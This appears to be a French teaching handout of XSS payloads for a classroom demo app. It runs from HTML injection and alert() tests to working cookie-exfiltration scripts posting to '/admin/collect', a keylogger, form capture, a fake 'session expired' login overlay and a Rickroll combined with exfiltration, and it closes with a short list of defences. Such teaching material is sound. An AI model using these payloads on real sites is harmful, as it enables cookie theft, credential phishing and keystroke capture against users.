# 🎯 Exemples de Payloads XSS

Ce document contient des exemples de payloads XSS à utiliser pour les démonstrations pédagogiques.

## ⚠️ Avertissement

Ces payloads sont fournis à des fins éducatives uniquement. Ne les utilisez JAMAIS sur des sites web sans autorisation explicite.

---

## 1️⃣ Injection HTML Basique (Chapitre 1)

### Texte en gras
```html
<strong>Ce texte est en gras</strong>
```

### Texte en italique
```html
<i>Ce texte est en italique</i>
```

### Grand titre
```html
<h1>Je suis un grand titre !</h1>
```

### Image
```html
<img src="https://via.placeholder.com/300x200/ff0000/ffffff?text=XSS+Demo" alt="Demo">
```

### Lien
```html
<a href="https://owasp.org">Visitez OWASP</a>
```

### Combinaison
```html
<div style="background:yellow;padding:20px;border:2px solid red;">
  <h2>Message important !</h2>
  <p>Ceci est du <strong>HTML injecté</strong></p>
</div>
```

---

## 2️⃣ XSS Simple avec alert() (Chapitre 2)

### Script classique
```html
<script>alert('XSS')</script>
```

### Image avec onerror
```html
<img src=x onerror="alert('XSS via onerror')">
```

### SVG avec onload
```html
<svg onload="alert('XSS via SVG')"></svg>
```

### Body avec onload
```html
<body onload="alert('XSS via body')">
```

### Input avec onfocus
```html
<input onfocus="alert('XSS via input')" autofocus>
```

### Iframe avec src javascript
```html
<iframe src="javascript:alert('XSS via iframe')"></iframe>
```

### Details avec ontoggle
```html
<details open ontoggle="alert('XSS via details')">
  <summary>Cliquez ici</summary>
</details>
```

### Div avec onmouseover
```html
<div onmouseover="alert('XSS via mouseover')" style="width:100%;height:100px;background:red;">
  Passez la souris ici
</div>
```

---

## 3️⃣ XSS Stocké (Chapitre 3)

### Message persistant
```html
<script>
  alert('Ce message s\'exécute à chaque chargement de la page !');
</script>
```

### Redirection automatique
```html
<script>
  setTimeout(function() {
    alert('Redirection dans 3 secondes...');
    window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
  }, 3000);
</script>
```

### Modification du contenu de la page
```html
<script>
  document.body.style.backgroundColor = 'black';
  document.body.innerHTML = '<h1 style="color:red;text-align:center;margin-top:50px;">🚨 SITE HACKÉ 🚨</h1>';
</script>
```

---

## 4️⃣ Exfiltration de données (Chapitre 4)

### Exfiltration du demoToken (DÉMONSTRATION)
```html
<script>
(function() {
  const cookies = document.cookie.split(';');
  let demoToken = 'NO_TOKEN';
  let userName = 'Unknown';

  for (let cookie of cookies) {
    const [name, value] = cookie.trim().split('=');
    if (name === 'demoToken') demoToken = value;
    if (name === 'userName') userName = decodeURIComponent(value);
  }

  fetch('/admin/collect', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      demoToken: demoToken,
      userName: userName,
      chapterId: window.location.pathname.split('/').pop()
    })
  });
})();
</script>
```

### Exfiltration discrète (sans alerte)
```html
<img src=x onerror="
  fetch('/admin/collect', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      demoToken: document.cookie.match(/demoToken=([^;]+)/)?.[1] || 'NO_TOKEN',
      userName: document.cookie.match(/userName=([^;]+)/)?.[1] || 'Unknown',
      chapterId: 'stealth'
    })
  })
">
```

### Exfiltration avec confirmation visuelle
```html
<script>
  const token = document.cookie.match(/demoToken=([^;]+)/)?.[1];

  fetch('/admin/collect', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      demoToken: token,
      userName: document.cookie.match(/userName=([^;]+)/)?.[1],
      chapterId: 'visual'
    })
  }).then(() => {
    alert('✅ Token exfiltré: ' + token);
  });
</script>
```

---

## 5️⃣ Payloads Avancés

### Keylogger (enregistrement des touches)
```html
<script>
  let keys = '';
  document.addEventListener('keypress', function(e) {
    keys += e.key;
    if (keys.length > 50) {
      console.log('Touches enregistrées:', keys);
      keys = '';
    }
  });
</script>
```

### Capture de formulaire
```html
<script>
  document.addEventListener('submit', function(e) {
    const formData = new FormData(e.target);
    const data = Object.fromEntries(formData.entries());
    console.log('Formulaire capturé:', data);

    // En situation réelle, ceci serait envoyé à un serveur attaquant
    fetch('/admin/collect', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({
        demoToken: 'FORM_DATA',
        userName: JSON.stringify(data),
        chapterId: 'form-capture'
      })
    });
  });
</script>
```

### Injection de faux formulaire de login
```html
<div style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:white;padding:30px;border:2px solid red;z-index:9999;box-shadow:0 0 20px rgba(0,0,0,0.5);">
  <h2>Session expirée</h2>
  <p>Veuillez vous reconnecter :</p>
  <form onsubmit="alert('Identifiants capturés: ' + this.username.value + ' / ' + this.password.value); return false;">
    <input type="text" name="username" placeholder="Nom d'utilisateur" style="display:block;margin:10px 0;padding:8px;width:100%;">
    <input type="password" name="password" placeholder="Mot de passe" style="display:block;margin:10px 0;padding:8px;width:100%;">
    <button type="submit" style="padding:10px 20px;background:red;color:white;border:none;cursor:pointer;">Se reconnecter</button>
  </form>
</div>
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);z-index:9998;"></div>
```

---

## 6️⃣ Payload Rickroll Complet

### Rickroll + Exfiltration (pour l'admin)
```html
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:9999;display:flex;align-items:center;justify-content:center;" id="rickroll">
  <div style="text-align:center;max-width:800px;">
    <h1 style="color:white;margin-bottom:20px;">🎵 You've been Rickrolled! 🎵</h1>
    <iframe width="560" height="315" src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
    <br><br>
    <button onclick="document.getElementById('rickroll').remove()" style="padding:10px 20px;font-size:16px;background:#ff4444;color:white;border:none;border-radius:5px;cursor:pointer;">Fermer</button>
  </div>
</div>
<script>
(function() {
  const cookies = document.cookie.split(';');
  let demoToken = 'NO_TOKEN';
  let userName = 'Unknown';

  for (let cookie of cookies) {
    const [name, value] = cookie.trim().split('=');
    if (name === 'demoToken') demoToken = value;
    if (name === 'userName') userName = decodeURIComponent(value);
  }

  fetch('/admin/collect', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      demoToken: demoToken,
      userName: userName,
      chapterId: window.location.pathname.split('/').pop()
    })
  });
})();
</script>
```

---

## 🛡️ Défenses

Pour chaque payload ci-dessus, voici comment se protéger :

1. **Échappement** : Convertir `<` en `&lt;`, `>` en `&gt;`, etc.
2. **Sanitization** : Utiliser DOMPurify ou sanitize-html
3. **CSP** : Content-Security-Policy pour bloquer les scripts inline
4. **HttpOnly cookies** : Empêcher l'accès JavaScript aux cookies sensibles
5. **Validation** : Rejeter les entrées suspectes

Consultez `/defense` dans l'application pour plus de détails.

---

## 📚 Utilisation pédagogique

### Pour les chapitres 1-2
Donnez aux élèves les payloads simples et demandez-leur de les tester.

### Pour le chapitre 3
Montrez comment les payloads persistent après rechargement.

### Pour le chapitre 4
L'admin utilise le payload Rickroll pour la démonstration finale.

### Pour le chapitre 5
Activez le mode SAFE et montrez comment les payloads sont neutralisés.

---

**Rappel :** Ces payloads sont à usage pédagogique uniquement. L'utilisation malveillante est illégale et contraire à l'éthique !
